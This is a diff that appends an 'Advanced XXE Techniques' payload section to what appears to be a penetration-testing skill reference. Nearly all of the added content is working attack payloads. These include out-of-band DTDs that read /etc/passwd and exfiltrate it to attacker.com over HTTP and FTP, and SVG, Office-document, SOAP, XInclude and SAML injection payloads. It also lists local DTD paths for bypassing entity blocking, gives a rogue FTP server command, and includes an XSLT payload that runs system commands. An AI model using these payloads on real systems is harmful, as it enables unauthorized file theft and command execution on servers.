@@ -854,3 +854,150 @@ Remediation:
 - `references/file-targets.md` — high-value files to read per OS/framework/language
 - `references/tools.md` — XXEinjector, Burp workflow, OOB servers, Gopherus
 - `scripts/xxe_probe.py` — automated XXE tester with OOB detection and FTP exfil server
+
+
+---
+
+## From hack-skills: Advanced XXE Techniques
+
+### OOB XXE via Attacker-Hosted DTD
+
+When external entities are allowed but response doesn't reflect content, use OOB:
+
+```xml
+<!-- Step 1: Host evil.dtd on attacker server: -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
+%exfil;
+%send;
+
+<!-- Step 2: Inject into XML body: -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+<foo>&xxe;</foo>
+```
+
+### Error-Based OOB (via Non-Existent File Path)
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % oob "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%oob;
+%error;
+<!-- Error message reveals file contents: "java.io.FileNotFoundException: /nonexistent/root:x:0:0..." -->
+```
+
+### SVG XXE
+
+Upload SVG with embedded XXE when image preview reflects content:
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+  <text y="16">&xxe;</text>
+</svg>
+```
+
+### OOXML (docx/xlsx/pptx) XXE
+
+```bash
+# Unzip the Office file:
+unzip document.docx -d docx_extracted/
+
+# Edit word/document.xml to inject XXE:
+# Add before <w:document> tag:
+# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+# Then reference &xxe; inside the document body
+
+# Rezip:
+cd docx_extracted && zip -r ../evil.docx .
+```
+
+### SOAP XXE
+
+```xml
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <soapenv:Body>
+    <foo>&xxe;</foo>
+  </soapenv:Body>
+</soapenv:Envelope>
+```
+
+### XInclude Attack (no DTD control needed)
+
+When you can't modify DOCTYPE but control an XML value processed by the parser:
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" parse="text"/>
+</foo>
+```
+
+### Local DTD Injection (Blocked External Entities)
+
+When external DTD is blocked but internal doctype is allowed, use a local DTD file to redefine an entity:
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamsa '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;http://attacker.com/?d=&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;exfil;
+  '>
+  %local_dtd;
+]>
+```
+
+**Common local DTD paths (Linux):**
+```
+/usr/share/yelp/dtd/docbookx.dtd
+/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
+/etc/xml/catalog
+/usr/share/doc/xml-core/schema/
+```
+
+**Common local DTD paths (Windows):**
+```
+C:\Windows\System32\drivers\etc\hosts
+C:\Program Files\Common Files\Microsoft Shared\...
+```
+
+### FTP-Based Line-by-Line Exfiltration
+
+For files with newlines (FTP protocol strips newlines allowing one-line-at-a-time exfil):
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
+  %exfil; %send;
+]>
+```
+
+Run a rogue FTP server: `python3 -m pyftpdlib -p 2121` — each line of the file arrives as a separate FTP command.
+
+### SAML XXE
+
+SAML requests/responses are base64-encoded XML. Inject XXE into the decoded XML:
+```bash
+# Decode the SAMLResponse:
+echo "BASE64_SAML" | base64 -d > saml.xml
+
+# Edit saml.xml: add XXE DOCTYPE declaration
+# Re-encode:
+base64 -w0 saml.xml > saml_encoded.txt
+
+# Send the modified base64 value in the SAMLResponse parameter
+```
+
+### XSLT Injection → XXE Connection
+
+XSLT processors often support XXE. Xalan-J (Java):
+```xml
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+  <xsl:template match="/">
+    <xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
